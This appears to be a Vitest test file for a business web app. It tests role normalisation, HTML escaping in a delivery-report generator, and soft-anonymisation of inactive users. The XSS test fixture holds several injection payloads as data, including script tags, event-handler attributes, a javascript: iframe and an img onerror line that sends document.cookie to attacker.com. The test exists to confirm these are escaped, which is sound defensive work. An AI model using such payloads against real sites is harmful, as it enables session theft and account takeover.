import { describe, it, expect, vi, beforeEach } from "vitest";
import {
  normalizeRole,
  isBusinessPartnerRole,
  canAccessPartnerPortal,
  resolveRoleDashboardUrl,
  ROLES,
  ROLE_HIERARCHY,
} from "@/lib/auth/roles";
import { escapeHtml, compileDeliveryReportHtml } from "@/lib/reports/project-report-generator";
import { cleanupInactiveUsers } from "@/lib/jobs/cleanup-inactive-users";
import { db } from "@/lib/db";

// Mock the db client for safe synthetic testing without mutating production
vi.mock("@/lib/db", () => {
  const mockTx = {
    session: { deleteMany: vi.fn().mockResolvedValue({ count: 1 }) },
    userPreference: { deleteMany: vi.fn().mockResolvedValue({ count: 1 }) },
    reminder: { deleteMany: vi.fn().mockResolvedValue({ count: 0 }) },
    notification: { deleteMany: vi.fn().mockResolvedValue({ count: 2 }) },
    auditLog: { updateMany: vi.fn().mockResolvedValue({ count: 5 }) },
    securityEvent: { updateMany: vi.fn().mockResolvedValue({ count: 0 }) },
    user: {
      update: vi.fn().mockResolvedValue({ id: "user-123", status: "ARCHIVED" }),
      delete: vi.fn(), // Should NOT be called
    },
  };

  return {
    db: {
      user: {
        findMany: vi.fn(),
        findUnique: vi.fn(),
      },
      auditLog: {
        create: vi.fn().mockResolvedValue({ id: "audit-1" }),
      },
      $transaction: vi.fn(async (cb: (tx: any) => Promise<any>) => cb(mockTx)),
      _mockTx: mockTx,
    },
  };
});

describe("Role Consolidation: Business Partner and Broker Equality", () => {
  it("normalizes legacy BROKER and PARTNER to canonical BUSINESS_PARTNER", () => {
    expect(normalizeRole("BROKER")).toBe("BUSINESS_PARTNER");
    expect(normalizeRole("broker")).toBe("BUSINESS_PARTNER");
    expect(normalizeRole("PARTNER")).toBe("BUSINESS_PARTNER");
    expect(normalizeRole("partner")).toBe("BUSINESS_PARTNER");
    expect(normalizeRole("BUSINESS_PARTNER")).toBe("BUSINESS_PARTNER");
    expect(normalizeRole("business_partner")).toBe("BUSINESS_PARTNER");
  });

  it("leaves standard internal roles intact", () => {
    expect(normalizeRole("ADMIN")).toBe("ADMIN");
    expect(normalizeRole("FOUNDER")).toBe("FOUNDER");
    expect(normalizeRole("CO_FOUNDER")).toBe("CO_FOUNDER");
    expect(normalizeRole("EMPLOYEE")).toBe("EMPLOYEE");
    expect(normalizeRole("CLIENT")).toBe("CLIENT");
    expect(normalizeRole("")).toBe("USER");
    expect(normalizeRole(null)).toBe("USER");
  });

  it("correctly identifies business partner accounts via isBusinessPartnerRole", () => {
    expect(isBusinessPartnerRole("BROKER")).toBe(true);
    expect(isBusinessPartnerRole("BUSINESS_PARTNER")).toBe(true);
    expect(isBusinessPartnerRole("PARTNER")).toBe(true);
    expect(isBusinessPartnerRole("ADMIN")).toBe(false);
    expect(isBusinessPartnerRole("EMPLOYEE")).toBe(false);
    expect(isBusinessPartnerRole("CLIENT")).toBe(false);
  });

  it("authorizes partners and administrators to partner portal via canAccessPartnerPortal", () => {
    expect(canAccessPartnerPortal("BROKER")).toBe(true);
    expect(canAccessPartnerPortal("BUSINESS_PARTNER")).toBe(true);
    expect(canAccessPartnerPortal("ADMIN")).toBe(true);
    expect(canAccessPartnerPortal("FOUNDER")).toBe(true);
    expect(canAccessPartnerPortal("CO_FOUNDER")).toBe(true);
    expect(canAccessPartnerPortal("EMPLOYEE")).toBe(false);
    expect(canAccessPartnerPortal("CLIENT")).toBe(false);
    expect(canAccessPartnerPortal("USER")).toBe(false);
  });

  it("routes both BROKER and BUSINESS_PARTNER to the single canonical partner dashboard", () => {
    expect(resolveRoleDashboardUrl("BROKER")).toBe("/broker/dashboard");
    expect(resolveRoleDashboardUrl("BUSINESS_PARTNER")).toBe("/broker/dashboard");
    expect(resolveRoleDashboardUrl("ADMIN")).toBe("/admin/dashboard");
    expect(resolveRoleDashboardUrl("FOUNDER")).toBe("/executive/dashboard");
    expect(resolveRoleDashboardUrl("CO_FOUNDER")).toBe("/executive/dashboard");
    expect(resolveRoleDashboardUrl("CLIENT")).toBe("/client/dashboard");
    expect(resolveRoleDashboardUrl("EMPLOYEE")).toBe("/employee/dashboard");
  });

  it("prioritizes canonical BUSINESS_PARTNER in ROLE_HIERARCHY", () => {
    expect(ROLE_HIERARCHY).toContain("BUSINESS_PARTNER");
    const bpIndex = ROLE_HIERARCHY.indexOf("BUSINESS_PARTNER");
    const brokerIndex = ROLE_HIERARCHY.indexOf("BROKER");
    expect(bpIndex).toBeLessThan(brokerIndex);
  });
});

describe("Stored XSS Mitigation in Project Delivery Report Generator", () => {
  it("escapes malicious HTML tags in strings via escapeHtml", () => {
    expect(escapeHtml("<script>alert('xss')</script>")).toBe(
      "&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;"
    );
    expect(escapeHtml('"><img src=x onerror=alert(1)>')).toBe(
      "&quot;&gt;&lt;img src=x onerror=alert(1)&gt;"
    );
    expect(escapeHtml("Tom & Jerry")).toBe("Tom &amp; Jerry");
  });

  it("neutralizes stored XSS payloads injected into delivery report metadata", () => {
    const maliciousData = {
      projectCode: 'AXP-2026-XSS"><script>alert(1)</script>',
      projectName: '<img src=x onerror=fetch("https://attacker.com/steal?c="+document.cookie)>',
      companyName: 'EvilCorp & Associates <script>evil()</script>',
      clientName: 'Attacker "><svg onload=alert(2)>',
      clientEmail: 'attacker@evil.com<script>',
      requiredService: 'Web Security <b onmouseover=alert(3)>Hover</b>',
      status: "IN_PROGRESS",
      qaStatus: "PASSED",
      milestones: [
        {
          title: 'Milestone 1 <script>alert("milestone")</script>',
          description: 'Description with <iframe src="javascript:alert(4)"></iframe>',
          status: "COMPLETED",
          completionDate: new Date(),
        },
      ],
      documents: [],
      contract: null,
    };

    const compiledHtml = compileDeliveryReportHtml(maliciousData);

    // Assert that executable script tags and unescaped quotes/brackets do not exist in raw form
    expect(compiledHtml).not.toContain("<script>alert(1)</script>");
    expect(compiledHtml).not.toContain('<img src=x onerror=fetch');
    expect(compiledHtml).not.toContain('<iframe src="javascript:alert(4)">');
    expect(compiledHtml).not.toContain('<svg onload=alert(2)>');

    // Assert that escaped entities are present
    expect(compiledHtml).toContain("&lt;script&gt;alert(1)&lt;/script&gt;");
    expect(compiledHtml).toContain("&lt;img src=x onerror=fetch");
    expect(compiledHtml).toContain("&lt;iframe src=&quot;javascript:alert(4)&quot;&gt;");
    expect(compiledHtml).toContain("EvilCorp &amp; Associates");
  });
});

describe("Data Integrity & Statutory Retention in Inactive User Cleanup", () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it("soft-anonymizes user record and does NOT execute hard tx.user.delete", async () => {
    const candidate = {
      id: "candidate-inactive-1",
      email: "former_employee@axivontech.in",
      name: "John Doe",
      status: "INACTIVE",
      inactiveAt: new Date(Date.now() - 40 * 24 * 60 * 60 * 1000), // 40 days ago
    };

    (db.user.findMany as any).mockResolvedValueOnce([candidate]);
    (db.user.findUnique as any).mockResolvedValueOnce(candidate);

    const result = await cleanupInactiveUsers();

    expect(result.processed).toBe(1);
    expect(result.deletedUserIds).toContain("candidate-inactive-1");

    const mockTx = (db as any)._mockTx;

    // Verify soft-anonymization update was called
    expect(mockTx.user.update).toHaveBeenCalledWith({
      where: { id: "candidate-inactive-1" },
      data: expect.objectContaining({
        email: "anonymized_candidate-inactive-1@archived.axivontech.in",
        name: "Archived Former Employee",
        status: "ARCHIVED",
        passwordHash: "ACCOUNT_ARCHIVED_NO_LOGIN",
      }),
    });

    // CRITICAL: Verify that tx.user.delete was NEVER invoked
    // This guarantees historical attendance, work reports, tasks, and QA issues are preserved
    expect(mockTx.user.delete).not.toHaveBeenCalled();

    // Verify transient records were cleaned up
    expect(mockTx.session.deleteMany).toHaveBeenCalledWith({ where: { userId: "candidate-inactive-1" } });
    expect(mockTx.notification.deleteMany).toHaveBeenCalledWith({ where: { userId: "candidate-inactive-1" } });

    // Verify audit logs were anonymized (retained for compliance with userId = null)
    expect(mockTx.auditLog.updateMany).toHaveBeenCalledWith({
      where: { userId: "candidate-inactive-1" },
      data: { userId: null },
    });
  });
});
